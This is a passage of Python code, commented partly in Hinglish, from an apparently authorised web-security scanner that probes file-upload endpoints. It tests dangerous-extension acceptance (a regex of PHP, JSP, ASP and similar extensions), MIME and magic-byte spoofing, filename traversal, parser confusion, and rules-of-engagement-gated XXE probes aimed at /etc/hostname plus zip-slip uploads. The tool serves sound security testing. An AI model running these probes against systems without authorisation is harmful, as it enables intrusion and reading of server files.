    return (cands[0] if cands else "file"), last_r, tried, False

# ===========================================================================
# STAGE C: UPLOAD PROBE ENGINE (CROWN JEWEL - benign -> matrix -> verdict)
# ===========================================================================
EXEC_CTS = ("text/html", "application/x-httpd-php", "application/php",
            "text/x-php", "application/x-asp", "application/x-asp-net",
            "text/x-server-parsed-html")
INLINE_CTS = ("image/svg+xml", "text/plain", "application/xml", "text/xml")
SAFE_DISPOSAL = ("attachment", "force-download", "x-download")

DANGEROUS_EXT_RX = re.compile(
    r"\.(php[0-9]?|phtml|phar|jsp|jspx|asp|aspx|ashx|asmx|shtml|cgi|pl|py|"
    r"rb|war|jar|exe|dll|sh|bat|ps1|htaccess|ini|config)([.\s;].*)?$", re.I)


def serve_analysis(getback_r, fname, canary, base_url):
    """GET-back response ko serve-surface me classify karo (content redacted)."""
    ct = ""
    cd = ""
    nosniff = False
    try:
        ct = (getback_r.header("Content-Type") or "").split(";")[0].strip().lower()
        cd = (getback_r.header("Content-Disposition") or "").lower()
        nosniff = "nosniff" in (getback_r.header("X-Content-Type-Options") or
                                "").lower()
    except Exception:
        pass
    body_match = bool(canary and canary.lower() in (getback_r.text or "").lower())
    ext = (fname.rsplit(".", 1)[-1] if "." in fname else "").lower()
    risky = bool(DANGEROUS_EXT_RX.search(fname))
    verdict_serve = "SAFE_SERVE"
    reason = []
    if ct in EXEC_CTS:
        verdict_serve = "SERVED_EXEC"
        reason.append("exec-ct:%s" % ct)
    elif ct == "image/svg+xml" and "attachment" not in cd:
        verdict_serve = "SERVED_SVG_INLINE"
        reason.append("svg-inline")
    elif ct in ("text/html",) or (not ct and ext in ("html", "shtml")):
        verdict_serve = "SERVED_EXEC"
        reason.append("html-ct")
    elif ct in INLINE_CTS and risky:
        verdict_serve = "SERVED_ACTIVE_INLINE"
        reason.append("inline-ct+ext")
    if "attachment" in cd or "force-download" in cd or "x-download" in cd:
        if verdict_serve == "SERVED_EXEC":
            verdict_serve = "SERVED_DISPOSAL_EXEC"
            reason.append("attachment-softens")
        else:
            verdict_serve = "SAFE_SERVE"
            reason.append("attachment")
    if nosniff:
        reason.append("nosniff")
    return {"served": True, "status": getback_r.status, "ct": ct, "cd": cd,
            "nosniff": nosniff, "content_match": body_match,
            "sig": filesig(getback_r.body or b""), "ext": ext,
            "risky_ext": risky, "serve_verdict": verdict_serve,
            "reason": reason,
            "placeholder": REDACTED_PLACEHOLDER if body_match else ""}


def getback_probe(http, rec, url, base_url, meta, conf):
    """Uploaded file ka GET-back + serve analysis (+ auth differential)."""
    if not conf.get("files_getback", True):
        return {"served": False, "skipped": "files_getback=false"}
    paths = rec.get("located_urls") or []
    out = []
    for p in paths[:3]:
        try:
            r = http.get(p, allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            sa = serve_analysis(r, p.rsplit("/", 1)[-1], rec.get("canary", ""),
                                base_url)
            sa["url"] = p
            out.append(sa)
        except Exception as e:
            out.append({"served": False, "url": p,
                        "error": truncate(str(e), 100)})
    # anon/auth differential: wahi URL bina cookies (identity-less client)
    try:
        anon = http.identity("anonP16")
        if paths:
            ra = anon.get(paths[0], allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            rec["anon_getback"] = {
                "status": ra.status,
                "served": ra.status in (200, 206),
                "content_match": bool(rec.get("canary") and
                                      rec["canary"].lower() in
                                      (ra.text or "").lower())}
    except Exception:
        rec["anon_getback"] = {"served": False}
    return out[0] if len(out) == 1 else {"results": out,
                                         "served": any(o.get("served")
                                                       for o in out)}


def upload_probe_endpoint(http, qhttp, t, base_url, meta, conf, cp, home_sig,
                          form=None):
    """Stage C core: ek upload endpoint ka poora benign->matrix->verdict cycle.
    Returns rec (upload_matrix.json row)."""
    url = t["url"]
    canary = _canary("up")
    rec = {"url": url, "kind": t.get("kind", "upload"), "verdict": "NOISE",
           "signals": [], "canary": canary, "attempts": [], "probes": {}}
    base = baseline_endpoint(http, url.split("?")[0], conf, cp, meta, tag="u")
    rec["baseline"] = base
    if base.get("error") and not base.get("ok"):
        rec["verdict"] = "NOISE"
        rec["signals"].append("baseline-error:%s" % base.get("error", "")[:60])
        return rec
    # NOTE: upload endpoints GET par 404/405 (POST-only) NORMAL hai - wahan
    # soft-404 skip NAHI karte; benign POST hi decision deta hai.
    if base.get("status") in (404, 405):
        rec["signals"].append("get-404-post-only")
    rec["form_accept"] = (form or {}).get("accept_hints", [])

    # ---- param autodetect ----
    fields = []
    if form:
        fields = [(f["name"], f.get("value", "")) for f in
                  (form.get("fields") or [])
                  if f["type"] not in ("file", "submit") and
                  not re.search(r"(csrf|xsrf|token|nonce)", f["name"], re.I)]
        fields = fields[:4]
    param, first_r, tried, hit = autodetect_file_param(http, url, conf, meta,
                                                       form=form,
                                                       other_fields=fields)
    rec["param"] = param
    rec["param_tried"] = tried[:12]
    rec["fields"] = fields
    if first_r is not None:
        rec["probes"]["param-detect"] = {"status": first_r.status,
                                         "len": len(first_r.body or b"")}
    else:
        rec["probes"]["param-detect"] = {"status": None}
    if not hit:
        if first_r is not None and first_r.status in (403, 406, 429):
            rec["verdict"] = "BLOCKED"
            rec["signals"].append("blocked-at-param-probe")
            rec["probes"]["param-detect"] = {"status": first_r.status}
            return rec
        rec["verdict"] = "NOISE"
        rec["signals"].append("no-param-accepted")
        return rec

    # ---- benign baseline upload ----
    benign_name = "%s.png" % canary.lower()
    r_b = first_r if (first_r is not None and first_r.status) else _upload_once(
        http, url, param, benign_name, magic_png(canary), "image/png",
        fields=fields)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    sc_b, hits_b = upload_success(r_b, canary.lower(), url)
    fail_b, why_b = upload_failure(r_b)
    if _is_waf_block(r_b, base.get("waf")):
        rec["verdict"] = "BLOCKED"
        rec["signals"].append("waf-block-benign")
        return rec
    rec["probes"]["benign"] = {"status": r_b.status, "len": len(r_b.body or b""),
                               "score": sc_b, "hits": hits_b, "fail": why_b}
    if not (sc_b >= 1 or r_b.status in (200, 201, 202)):
        rec["verdict"] = "BLOCKED"
        rec["signals"].append("benign-rejected:%s" % why_b)
        rec["filter_type"] = "hard-block"
        return rec

    # ---- GET-back (benign) ----
    rec["located_urls"] = locate_uploaded_url(r_b.text or "", base_url, canary)
    if rec["located_urls"]:
        rec["getback"] = getback_probe(http, rec, url, base_url, meta, conf)

    # ---- filename/extension matrix ----
    fv = filename_variants(canary, cap=int(conf.get("files_ext_variants", 14)))
    ext_rows = []
    accepted_risky, served_exec, rejected_set = [], [], []
    for label, fname in fv:
        content = magic_png(canary)
        r = _upload_once(http, url, param, fname, content, "image/png",
                         fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, canary.lower(), url)
        fail, why = upload_failure(r)
        row = {"label": label, "filename": fname.replace("\x00", "<NUL>"),
               "status": r.status, "score": sc, "fail": why,
               "accepted": bool(sc >= 1 or r.status in (200, 201, 202))}
        if row["accepted"]:
            loc = locate_uploaded_url(r.text or "", base_url, canary)
            row["located"] = bool(loc)
            if loc and conf.get("files_getback", True):
                try:
                    rg = http.get(loc[0], allow_redirects=False)
                    meta["probes_total"] = meta.get("probes_total", 0) + 1
                    sa = serve_analysis(rg, fname, canary, base_url)
                    row["serve"] = {k: sa[k] for k in ("served", "status", "ct",
                                                       "cd", "nosniff",
                                                       "content_match",
                                                       "serve_verdict",
                                                       "reason")}
                    if sa["serve_verdict"] in ("SERVED_EXEC",
                                               "SERVED_ACTIVE_INLINE"):
                        served_exec.append((label, fname, sa))
                except Exception:
                    pass
            if DANGEROUS_EXT_RX.search(fname) or label in ("plain-dangerous",
                                                           "double-ext",
                                                           "phtml", "shtml",
                                                           "jsp"):
                accepted_risky.append((label, fname, row))
        else:
            rejected_set.append(label)
        ext_rows.append(row)
        if interrupted():
            break
    rec["ext_matrix"] = ext_rows
    rec["accepted_risky"] = [a[0] for a in accepted_risky]
    rec["served_exec"] = [(s[0], s[1], s[2]["serve_verdict"],
                           s[2].get("ct", "")) for s in served_exec]
    rec["rejected_labels"] = rejected_set[:10]

    # ---- content-type spoof matrix ----
    ct_rows = []
    ct_acc = []
    for ct, kind in ct_variants(cap=int(conf.get("files_ct_variants", 6))):
        r = _upload_once(http, url, param, "%s_ct.png" % canary.lower(),
                         magic_png(canary), ct, fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, canary.lower(), url)
        row = {"ct": ct, "kind": kind, "status": r.status, "score": sc,
               "accepted": bool(sc >= 1 or r.status in (200, 201, 202))}
        ct_rows.append(row)
        if row["accepted"] and kind != "honest":
            ct_acc.append(ct)
        if interrupted():
            break
    rec["ct_matrix"] = ct_rows
    rec["ct_spoof_accepted"] = ct_acc

    # ---- magic-byte check (GIF89a text as .png/.gif) ----
    r_m1 = _upload_once(http, url, param, "%s_m.png" % canary.lower(),
                        magic_gif(canary), "image/png", fields=fields)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    sc_m1, _ = upload_success(r_m1, canary.lower(), url)
    r_m2 = _upload_once(http, url, param, "%s_t.txt" % canary.lower(),
                        magic_png(canary), "text/plain", fields=fields)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    sc_m2, _ = upload_success(r_m2, canary.lower(), url)
    rec["magic_probe"] = {"gif-as-png": {"status": r_m1.status, "score": sc_m1},
                          "png-as-txt": {"status": r_m2.status, "score": sc_m2}}
    if sc_m1 >= 1:
        rec["signals"].append("magic-missing")

    # ---- filename traversal tricks ----
    trick_rows = []
    trav_hit = []
    for label, fname in filename_trick_variants(
            canary, cap=int(conf.get("files_filename_tricks", 6))):
        r = _upload_once(http, url, param, fname, magic_png(canary),
                         "image/png", fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, canary.lower(), url)
        fail, why = upload_failure(r)
        row = {"label": label, "filename": fname.replace("\x00", "<NUL>"),
               "status": r.status, "score": sc, "fail": why,
               "accepted": bool(sc >= 1 or r.status in (200, 201, 202))}
        # traversal-proof: ../ waale naam se parse hui filename response me
        if row["accepted"]:
            leaf = fname.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
            if leaf in (r.text or "") and leaf != fname:
                row["traversal_landed"] = True
                trav_hit.append(label)
        trick_rows.append(row)
        if interrupted():
            break
    rec["trick_matrix"] = trick_rows
    if trav_hit:
        rec["signals"].append("filename-traversal:%s" % ",".join(trav_hit[:2]))

    # ---- same-name overwrite canary ----
    if conf.get("files_same_name_probe", True):
        ov_name = "%s_ov.png" % canary.lower()
        c1 = "first %s" % canary
        c2 = "second %s" % canary
        _upload_once(http, url, param, ov_name, plain_text(c1), "text/plain",
                     fields=fields)
        r_ov = _upload_once(http, url, param, ov_name, plain_text(c2),
                            "text/plain", fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 2
        loc = locate_uploaded_url(r_ov.text or "", base_url, canary)
        overwrote = False
        if loc and conf.get("files_getback", True):
            try:
                rg = http.get(loc[0], allow_redirects=False)
                meta["probes_total"] = meta.get("probes_total", 0) + 1
                overwrote = canary in (rg.text or "") and \
                    ("second" in (rg.text or ""))
            except Exception:
                pass
        rec["overwrite_probe"] = {"name": ov_name, "overwritten": overwrote}
        if overwrote:
            rec["signals"].append("overwrite-same-name")

    # ---- verdict ladder ----
    verdict, technique = _upload_verdict(rec, r_b)
    rec["verdict"] = verdict
    rec["technique"] = technique
    return rec


def _upload_verdict(rec, r_benign):
    """Multi-signal verdict ladder (CONFIRMED..NOISE)."""
    sigs = rec.get("signals", [])
    served = rec.get("served_exec") or []
    risky = rec.get("accepted_risky") or []
    ext_rows = rec.get("ext_matrix") or []
    ct_spoof = rec.get("ct_spoof_accepted") or []
    benign_rejects = [x for x in ext_rows if not x.get("accepted")]
    benign_accepts = [x for x in ext_rows if x.get("accepted")]

    # 1) EXEC serve + risky accept = CONFIRMED (webshell-ready surface)
    if served and risky:
        return "CONFIRMED", "upload-exec-serve"
    # 2) filename traversal landed
    if any(s.startswith("filename-traversal") for s in sigs):
        return "CONFIRMED", "upload-filename-traversal"
    # 3) risky ext accepted par serve nahi (ya pata nahi)
    if risky and (benign_accepts or not benign_rejects):
        return "CONFIRMED", "upload-risky-ext-accepted"
    # 4) no-filter family: koi reject hi nahi hua
    if benign_accepts and not benign_rejects:
        if "overwrite-same-name" in sigs:
            return "SUSPECTED", "upload-no-validation"
        if ct_spoof:
            return "SUSPECTED", "upload-mime-bypass"
        if "magic-missing" in sigs:
            return "SUSPECTED", "upload-magic-missing"
    # 5) overwrite alag (jab filter to partially hai)
    if "overwrite-same-name" in sigs and len(benign_accepts) >= \
            max(1, len(benign_rejects)):
        return "SUSPECTED", "upload-no-validation"
    # 6) blacklist design: kuch risky reject hue, kuch accept
    if risky and benign_rejects:
        return "SUSPECTED", "upload-extension-blacklist"
    # 7) hardening: reject hai, risky accept nahi, spoof bhi irrelevant
    if benign_rejects and not risky:
        return "HARDENED", "upload-whitelist"
    if rec.get("verdict") == "BLOCKED":
        return "BLOCKED", "upload-blocked"
    if benign_accepts:
        return "SUSPECTED", "upload-benign-only"
    return "NOISE", ""

# ===========================================================================
# STAGE E: SVG / OFFICE IMPORT ENGINE (P15 handoff - parser trust)
# ===========================================================================
IMPORT_PATH_XE = re.compile(r"(?i)(import|xml|svg|parse|convert|docx|xlsx|"
                            r"office|saml|rpc|render|pdf)")


def import_probe_endpoint(http, qhttp, t, base_url, meta, conf, cp,
                          allow_xxe=False):
    """Import/parse endpoint par: (1) plain svg/docx benign census (2) GATED
    entity payloads (files_allow_import_xxe). Verdict: parser entity-processing
    differential (error-family echo)."""
    url = t["url"]
    canary = _canary("im")
    rec = {"url": url, "kind": "import", "verdict": "NOISE", "signals": [],
           "canary": canary, "gate_xxe": bool(allow_xxe)}
    hostname = host_of(base_url) or "127.0.0.1"
    target_file = "/etc/hostname"
    probe_path = url if url.startswith("http") else urljoin_safe(base_url, url)
    method_hint = (t.get("method") or "POST").upper()

    # ---- plain SVG upload (benign, hamesha) ----
    body, ct = multipart_body("file", "%s.svg" % canary.lower(),
                              svg_plain(canary), "image/svg+xml")
    try:
        r_svg = http.post(probe_path, data=body,
                          headers={"Content-Type": ct}, force_write=True,
                          allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        rec["svg_plain"] = {"status": r_svg.status,
                            "len": len(r_svg.body or b""),
                            "reflect": canary in (r_svg.text or "")}
        if r_svg.status in (200, 201, 202):
            rec["signals"].append("svg-accepted")
    except Exception as e:
        rec["svg_plain"] = {"error": truncate(str(e), 100)}

    # ---- docx benign (zip census, benign docx without entity) ----
    benign_docx = _docx_benign_bytes(canary)
    body, ct = multipart_body("file", "%s.docx" % canary.lower(),
                              benign_docx,
                              "application/vnd.openxmlformats-officedocument."
                              "wordprocessingml.document")
    try:
        r_dx = http.post(probe_path, data=body,
                         headers={"Content-Type": ct}, force_write=True,
                         allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        rec["docx_benign"] = {"status": r_dx.status,
                              "len": len(r_dx.body or b"")}
        if r_dx.status in (200, 201, 202):
            rec["signals"].append("docx-accepted")
    except Exception as e:
        rec["docx_benign"] = {"error": truncate(str(e), 100)}

    # ---- GATED entity probes (files_allow_import_xxe) ----
    if not allow_xxe:
        rec["verdict"] = "SKIPPED"
        rec["signals"].append("xxe-gate-off")
        rec["manual_wave"] = ("svg_entity.svg + docx_entity_import.docx INERT "
                              "payloads upload_payloads/ me ready hain - "
                              "files_allow_import_xxe=true RoE check karke")
        return rec
    before_err = ""
    try:
        r_pre = http.get(probe_path.split("?")[0], allow_redirects=False)
        before_err = (r_pre.text or "")[:200]
    except Exception:
        pass
    fams = []
    for fam, payload, fname, ctype in (
            ("svg-xxe", svg_entity(canary, target_file),
             "%s_x.svg" % canary.lower(), "image/svg+xml"),
            ("docx-xxe", docx_entity_bytes(canary, target_file),
             "%s_x.docx" % canary.lower(),
             "application/vnd.openxmlformats-officedocument.wordprocessingml."
             "document")):
        assert_inert(payload, "import-%s" % fam)
        body, ct = multipart_body("file", fname, payload, ctype)
        try:
            r = http.post(probe_path, data=body, headers={"Content-Type": ct},
                          force_write=True, allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            txt = r.text or ""
            marker = bool(canary.lower() in txt.lower() or
                          "xxe" in txt.lower() and canary.lower() in txt.lower())
            errdiff = bool(txt and before_err and txt[:200] != before_err and
                           re.search(r"(?i)(error|exception|failed|warning|"
                                     r"invalid|entity)", txt))
            path_echo = target_file in txt
            fams.append({"family": fam, "status": r.status,
                         "len": len(r.body or b""), "marker": marker,
                         "error_differential": errdiff,
                         "path_echo": bool(path_echo and not marker)})
        except Exception as e:
            fams.append({"family": fam, "error": truncate(str(e), 100)})
        if interrupted():
            break
    rec["families"] = fams
    if any(f.get("path_echo") for f in fams):
        rec["verdict"] = "CONFIRMED"
        rec["technique"] = "import-xxe-path-echo"
        rec["signals"].append("import-xxe")
    elif any(f.get("marker") for f in fams):
        rec["verdict"] = "CONFIRMED"
        rec["technique"] = "import-xxe-marker"
        rec["signals"].append("import-xxe")
    elif any(f.get("error_differential") for f in fams):
        rec["verdict"] = "SUSPECTED"
        rec["technique"] = "import-xxe-error-differential"
        rec["signals"].append("import-xxe-error")
    else:
        rec["verdict"] = "HARDENED"
        rec["signals"].append("entities-rejected")
    return rec


def _docx_benign_bytes(canary):
    """Entity-free benign docx (zip census ke liye - INERT)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                   '<Types xmlns="http://schemas.openxmlformats.org/package/'
                   '2006/content-types"><Default Extension="rels" ContentType='
                   '"application/vnd.openxmlformats-package.relationships+xml"/>'
                   '<Default Extension="xml" ContentType="application/xml"/>'
                   '<Override PartName="/word/document.xml" ContentType='
                   '"application/vnd.openxmlformats-officedocument.'
                   'wordprocessingml.document.main+xml"/></Types>')
        z.writestr("word/document.xml",
                   '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                   '<w:document xmlns:w="http://schemas.openxmlformats.org/'
                   'wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>'
                   '%s</w:t></w:r></w:p></w:body></w:document>' % canary)
    return buf.getvalue()


# ===========================================================================
# STAGE F: ARCHIVE ENGINE (zip-slip, RoE-gated) + STAGE G: listing/auth
# ===========================================================================
def archive_probe_endpoint(http, t, base_url, meta, conf, allow_archive=False):
    """zip-slip INERT archive upload (GATED). Differential: normal entry vs
    traversal entry acceptance."""
    url = t["url"]
    canary = _canary("ar")
    rec = {"url": url, "kind": "archive", "gated": not allow_archive,
           "verdict": "SKIPPED" if not allow_archive else "NOISE",
           "signals": [], "canary": canary}
    if not allow_archive:
        rec["manual_wave"] = ("zipslip_canary.zip INERT payload "
                              "upload_payloads/ me ready - "
                              "files_allow_archive=true RoE check karke")
        return rec
    probe_path = url if url.startswith("http") else urljoin_safe(base_url, url)
    body, ct = multipart_body("file", "%s.zip" % canary.lower(),
                              zipslip_bytes(canary), "application/zip")
    try:
        r = http.post(probe_path, data=body, headers={"Content-Type": ct},
                      force_write=True, allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        txt = r.text or ""
        rec["response"] = {"status": r.status, "len": len(r.body or b"")}
        slipname = "%s_slip0.txt" % canary.lower()
        rec["slip_reflected"] = slipname in txt
        rec["verdict"] = ("SUSPECTED" if (r.status in (200, 201, 202) and
                                          rec["slip_reflected"]) else
                          ("NOISE" if r.status in (200, 201, 202)
                           else "NOISE"))
        if rec["slip_reflected"]:
            rec["signals"].append("zip-slip-entry-reflected")
        if r.status in (200, 201, 202):
            rec["signals"].append("archive-accepted")
    except Exception as e:
        rec["response"] = {"error": truncate(str(e), 100)}
    return rec


def listing_probe(http, located_urls, base_url, meta, conf):
    """Upload-directory listing + storage-hardening census (G rows)."""
    out = []
    dirs = []
    for u in located_urls[:max(1, int(conf.get("files_list_dirs", 6)))]:
        d = u.rsplit("/", 1)[0] + "/"
        if d not in dirs and d.startswith("http"):
            dirs.append(d)
    for d in dirs:
        try:
            r = http.get(d, allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            txt = r.text or ""
            listing = bool(r.status == 200 and
                           (re.search(r"(?i)Index of /", txt) or
                            ("<a href" in txt and re.search(
                                r"(?i)\.(png|jpe?g|gif|pdf|docx?|xlsx?|zip|"
                                r"svg|txt)</a>", txt))))
            row = {"dir": d, "status": r.status, "listing": listing}
            if listing:
                row["file_hrefs"] = len(re.findall(
                    r"(?i)href=[\"'][^\"']+\.(?:png|jpe?g|gif|svg|pdf|zip|"
                    r"docx?|txt)", txt))
            out.append(row)
        except Exception as e:
            out.append({"dir": d, "error": truncate(str(e), 100)})
        if interrupted():
            break
    return out


def cleanup_attempt(http, url, located_urls, meta):
    """Best-effort DELETE of APNE canary files (RoE-gated). Sirf located URLs
    jo hamari upload se mile the - koi guess/delete nahi."""
    res = []
    for p in (located_urls or [])[:2]:
        try:
            r = http.request("DELETE", p, force_write=True,
                             allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 1
            res.append({"url": p, "status": r.status,
                        "deleted": r.status in (200, 202, 204)})
        except Exception as e:
            res.append({"url": p, "error": truncate(str(e), 80)})
    return res


# ===========================================================================
# STAGE H: DIFFERENTIAL SUMMARY
# ===========================================================================
# ===========================================================================
# v17 ULTRA ENGINES: deep-dive families (sab INERT, detection-only)
# ===========================================================================
BENIGN_CTRL_EXTS = ("png", "jpg", "gif", "txt", "pdf", "zip")
EXT_MODEL_POOL = list(BENIGN_CTRL_EXTS) + DANGEROUS_EXTS + [
    "pht", "pgif", "php7", "jspa", "asa", "asax", "asmx", "cer", "cfm",
    "py", "rb", "exe", "war", "jar", "dll", "html", "htm", "svg", "swf",
    "hta"]


def ext_acceptance_matrix(http, url, param, fields, canary, meta, conf):
    """EXT-MODEL ENGINE: har extension ek-ek karke benign-png content ke
    saath -> blacklist/whitelist/gaps model + server-tech hints. INERT."""
    cap = max(6, int(conf.get("files_ext_matrix_cap", 34)))
    rows, acc_ext, rej_ext = [], [], []
    for ext in EXT_MODEL_POOL[:cap]:
        fname = "%s_em.%s" % (canary.lower(), ext)
        r = _upload_once(http, url, param, fname, magic_png(canary),
                         "image/png", fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, canary.lower(), url)
        ok = bool(sc >= 1 or r.status in (200, 201, 202))
        rows.append({"ext": ext, "status": r.status, "accepted": ok,
                     "risky": ext in DANGEROUS_EXTS})
        (acc_ext if ok else rej_ext).append(ext)
        if interrupted():
            break
    risky_acc = [e for e in acc_ext if e in DANGEROUS_EXTS]
    ctrl_acc = [e for e in acc_ext if e in BENIGN_CTRL_EXTS]
    if not rows:
        model = "not-run"
    elif risky_acc and not rej_ext:
        model = "no-validation"
    elif not risky_acc and ctrl_acc:
        model = "whitelist-or-sanitizer"
    elif risky_acc and rej_ext:
        model = "blacklist-gapped"
    else:
        model = "partial-filter"
    hints = []
    rset = set(rej_ext)
    if {"asp", "aspx", "asa", "asax", "cer", "ashx", "asmx"} & rset and \
            "php" not in rset:
        hints.append("iis-tuned-blacklist")
    if {"jsp", "jspx", "war"} & rset and "php" not in rset:
        hints.append("java-container-tuned")
    if "php" in rset and "phtml" in acc_ext:
        hints.append("php-only-blacklist")
    if {"php", "phtml", "php5"} <= rset and {"jpg", "png"} - rset:
        hints.append("strict-whitelist")
    return {"rows": rows, "model": model, "accepted": acc_ext[:24],
            "rejected": rej_ext[:24], "risky_accepted": risky_acc[:12],
            "hints": hints}


def multipart_confusion_probe(http, url, param, fields, canary, meta, conf):
    """PARSER-CONFUSION ENGINE: INERT multipart variants -> parser
    leniency/strictness census (WAF-vs-backend differential signals)."""
    cap = max(4, int(conf.get("files_confusion_cap", 14)))
    png = magic_png(canary)
    rows, acc = [], []
    for lbl, fn in CONFUSION_BUILDERS[:cap]:
        try:
            body, ct = fn(param, "%s_conf.php" % canary.lower(), png,
                          "image/png", canary=canary)
        except Exception as e:
            rows.append({"label": lbl, "error": truncate(str(e), 60)})
            continue
        try:
            r = http.post(url, data=body,
                          headers={"Content-Type": ct,
                                   "X-WASP-Probe": "P16-mp-confusion"},
                          force_write=True, allow_redirects=False)
        except ScopeError:
            raise
        except Exception as e:
            rows.append({"label": lbl, "error": truncate(str(e), 60)})
            continue
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, canary.lower(), url)
        fail, why = upload_failure(r)
        ok = bool(sc >= 1 or r.status in (200, 201, 202))
        rows.append({"label": lbl, "status": r.status, "score": sc,
                     "fail": why, "accepted": ok})
        if ok:
            acc.append(lbl)
        if interrupted():
            break
    if not rows:
        signal = "not-run"
    elif len(acc) >= max(2, len(rows) // 2):
        signal = "parser-lenient"
    elif not acc:
        signal = "parser-strict"
    else:
        signal = "parser-mixed"
    return {"rows": rows, "accepted": acc, "parser_signal": signal}


def magic_consistency_probe(http, url, param, fields, canary, meta, conf):
    """MAGIC-CONSISTENCY ENGINE: magic-vs-ext-vs-CT mismatch combos ->
    content-inspection depth fingerprint (none/ext-ct-only/magic-enforced)."""
    b = canary.lower()
    combos = [
        ("gif-magic-png-name", "%s_mc1.png" % b, magic_gif(canary),
         "image/png"),
        ("png-magic-gif-name", "%s_mc2.gif" % b, magic_png(canary),
         "image/gif"),
        ("pdf-magic-png-name", "%s_mc3.png" % b, magic_pdf(canary),
         "image/png"),
        ("zip-magic-jpg-name", "%s_mc4.jpg" % b, magic_zip(canary),
         "image/jpeg"),
        ("jpg-magic-png-name", "%s_mc5.png" % b, magic_jpg(canary),
         "image/png"),
        ("text-as-png-name", "%s_mc6.png" % b, plain_text(canary),
         "image/png"),
        ("png-magic-mp4-name", "%s_mc7.mp4" % b, magic_png(canary),
         "video/mp4"),
    ]
    rows, acc = [], []
    for lbl, fname, content, ct in combos:
        r = _upload_once(http, url, param, fname, content, ct, fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, canary.lower(), url)
        ok = bool(sc >= 1 or r.status in (200, 201, 202))
        rows.append({"label": lbl, "status": r.status, "accepted": ok})
        if ok:
            acc.append(lbl)
        if interrupted():
            break
    if not rows:
        depth = "not-run"
    elif len(acc) >= len(rows) - 1:
        depth = "no-content-inspection"
    elif acc:
        depth = "ext-ct-only"
    else:
        depth = "magic-enforced"
    return {"rows": rows, "accepted": acc, "inspection_depth": depth}


def client_bypass_probe(http, url, param, fields, form, canary, meta, conf):
    """CLIENT-SIDE BYPASS ENGINE: accept= hints + MAX_FILE_SIZE hidden field
    ka server-side enforcement differential (client-only-filter detection)."""
    res = {"accept_hints": (form or {}).get("accept_hints", []),
           "max_file_size": None, "rows": [], "client_only_limit": False,
           "client_only_accept": False}
    mfs = None
    for k, v in ((form or {}).get("max_hints") or []):
        try:
            mfs = max(mfs or 0, int(v))
        except Exception:
            pass
    res["max_file_size"] = mfs
    b = canary.lower()
    if mfs and 0 < mfs < int(conf.get("files_max_bytes", 2048)):
        big = magic_png(canary) + b"A" * min(512, max(16, mfs * 2))
        r = _upload_once(http, url, param, "%s_big.png" % b, big,
                         "image/png", fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, b, url)
        ok = bool(sc >= 1 or r.status in (200, 201, 202))
        res["rows"].append({"probe": "over-max-file-size", "size": len(big),
                            "limit": mfs, "status": r.status,
                            "accepted": ok})
        res["client_only_limit"] = ok
    hints = res["accept_hints"]
    if hints:
        outside = "txt" if not any("txt" in h for h in hints) else "bin"
        r2 = _upload_once(http, url, param, "%s_out.%s" % (b, outside),
                          magic_png(canary), "image/png", fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc2, _h2 = upload_success(r2, b, url)
        ok2 = bool(sc2 >= 1 or r2.status in (200, 201, 202))
        res["rows"].append({"probe": "outside-accept-hint", "ext": outside,
                            "status": r2.status, "accepted": ok2})
        res["client_only_accept"] = ok2
    return res


def exotic_format_census(http, url, param, fields, canary, meta, conf):
    """EXOTIC-FORMAT ENGINE: office/archive/media/cert acceptance census
    (xlsx/odt/docx/zip/gz/7z/rar/ico/webp/mp4/pdf/html). Sab INERT benign."""
    b = canary.lower()
    items = [
        ("xlsx", "%s_ex.xlsx" % b, xlsx_benign_bytes(canary),
         "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
        ("odt", "%s_ex.odt" % b, odt_benign_bytes(canary),
         "application/vnd.oasis.opendocument.text"),
        ("docx", "%s_ex.docx" % b, _docx_benign_bytes(canary),
         "application/vnd.openxmlformats-officedocument."
         "wordprocessingml.document"),
        ("zip", "%s_ex.zip" % b, magic_zip(canary), "application/zip"),
        ("gz", "%s_ex.gz" % b, magic_gzip(canary), "application/gzip"),
        ("7z", "%s_ex.7z" % b, magic_7z(canary),
         "application/x-7z-compressed"),
        ("rar", "%s_ex.rar" % b, magic_rar(canary), "application/vnd.rar"),
        ("ico", "%s_ex.ico" % b, magic_ico(canary), "image/x-icon"),
        ("webp", "%s_ex.webp" % b, magic_webp(canary), "image/webp"),
        ("mp4", "%s_ex.mp4" % b, magic_mp4(canary), "video/mp4"),
        ("pdf", "%s_ex.pdf" % b, magic_pdf(canary), "application/pdf"),
        ("html", "%s_ex.html" % b, html_inert_doc(canary), "text/html"),
    ]
    rows, fams = [], set()
    for fam, fname, content, ct in items:
        r = _upload_once(http, url, param, fname, content, ct, fields=fields)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sc, _h = upload_success(r, b, url)
        ok = bool(sc >= 1 or r.status in (200, 201, 202))
